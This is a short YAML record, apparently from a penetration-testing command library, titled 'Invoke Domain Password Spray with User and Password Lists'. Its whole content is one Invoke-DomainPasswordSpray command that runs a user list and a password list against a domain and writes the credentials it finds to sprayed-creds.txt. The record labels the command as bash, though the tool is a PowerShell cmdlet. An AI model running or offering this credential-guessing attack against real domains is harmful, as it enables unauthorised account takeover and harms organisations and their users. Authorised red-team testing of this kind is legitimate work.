---
id: de7e824a-31f2-4d7a-b2e4-ff0ce6d2ba55
name: Invoke Domain Password Spray with User and Password Lists
type: command
executor: bash
data: Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList
  passlist.txt -OutFile sprayed-creds.txt
output: null
created_at: '2023-04-06T03:56:04.297500+00:00'
updated_at: '2023-04-10T20:25:55.315382+00:00'
---

# Invoke Domain Password Spray with User and Password Lists

```bash
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```
